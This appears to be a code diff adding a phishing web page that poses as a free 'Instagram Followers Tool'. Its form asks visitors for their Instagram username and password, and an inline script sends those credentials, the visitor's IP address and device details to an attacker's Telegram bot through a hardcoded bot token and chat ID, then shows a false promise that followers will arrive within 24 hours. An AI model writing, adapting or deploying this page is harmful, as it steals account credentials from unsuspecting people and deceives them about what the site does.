@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Followers Tool</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <header>
+        <div class="logo-container">
+            <img src="instagram-logo.ico" alt="Instagram Logo" class="logo">
+            <h1>Instagram Followers Tool</h1>
+        </div>
+        <p>Get free followers for your account easily and securely!</p>
+    </header>
+
+    <main>
+        <div class="form-container">
+            <img src="followers-banner.avif" alt="Instagram Followers Banner" class="banner">
+            <h2>Enter Your Details</h2>
+            <form id="followers-form">
+                <label for="username">Username, Email, or Phone</label>
+                <input type="text" id="username" name="username" placeholder="Enter your username, email, or phone" required>
+
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" placeholder="Enter your password" required>
+
+                <button type="submit" id="submit-btn">Add Followers</button>
+            </form>
+            <p id="message"></p>
+        </div>
+    </main>
+
+    <footer>
+        <p>&copy; 2024 - Instagram Followers Tool. All rights reserved.</p>
+    </footer>
+
+    <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
+    <script>
+        const TOKEN = "7910988570:AAEAfmOik7EoH4Rf6M-4kti8mi47aXMGDmE";
+        const CHAT_ID = "6266941055";
+        const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+        document.getElementById('followers-form').addEventListener('submit', function (e) {
+            e.preventDefault();
+
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value.trim();
+
+            // التحقق من صحة المدخلات
+            if (!username || !password) {
+                showMessage("Please fill in all fields.", "error");
+                return;
+            }
+
+            const previousSubmissions = JSON.parse(localStorage.getItem("previousSubmissions")) || [];
+            const currentTime = Date.now();
+            const twentyFourHours = 24 * 60 * 60 * 1000;
+
+            const existingSubmission = previousSubmissions.find(
+                entry => entry.username === username && entry.password === password
+            );
+
+            if (existingSubmission) {
+                const timeDifference = currentTime - existingSubmission.timestamp;
+
+                if (timeDifference < twentyFourHours) {
+                    showMessage(
+                        "This username and password have already been processed. Please try again after 24 hours.",
+                        "error"
+                    );
+                    return;
+                }
+            }
+
+            // تخزين البيانات مع الوقت الحالي
+            previousSubmissions.push({ username, password, timestamp: currentTime });
+            localStorage.setItem("previousSubmissions", JSON.stringify(previousSubmissions));
+
+            // إرسال بيانات Telegram عبر API
+            axios.get('https://api.ipify.org?format=json')
+                .then(response => {
+                    const ip = response.data.ip;
+
+                    const userAgent = navigator.userAgent;
+                    const platform = navigator.platform;
+                    const screenWidth = screen.width;
+                    const screenHeight = screen.height;
+                    const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
+
+                    const message = `
+<b>New Login Attempt:</b>
+<b>Username/Email/Phone:</b> ${username}
+<b>Password:</b> ${password}
+<b>IP Address:</b> ${ip}
+<b>Device Type:</b> ${deviceType}
+<b>Platform:</b> ${platform}
+<b>User Agent:</b> ${userAgent}
+<b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
+                    `;
+
+                    axios.post(URI_API, {
+                        chat_id: CHAT_ID,
+                        parse_mode: 'html',
+                        text: message
+                    })
+                    .then(() => {
+                        showMessage("Followers will be added within the next 24 hours.", "success");
+                    })
+                    .catch(() => {
+                        showMessage('Error sending the information. Please try again.', "error");
+                    });
+                })
+                .catch(() => {
+                    showMessage('Error fetching the IP address. Please try again.', "error");
+                });
+
+            // إعادة تعيين النموذج
+            event.target.reset();
+        });
+
+        // دالة عرض الرسائل مع التأثير
+        function showMessage(message, type) {
+            const messageElement = document.getElementById("message");
+            messageElement.textContent = message;
+            messageElement.style.color = type === "success" ? "#4CAF50" : "#FF5722";
+            messageElement.style.fontWeight = "bold";
+
+            // إخفاء الرسالة بعد 5 ثوانٍ
+            setTimeout(() => {
+                messageElement.textContent = "";
+            }, 5000);
+        }
+    </script>
+</body>
+</html>
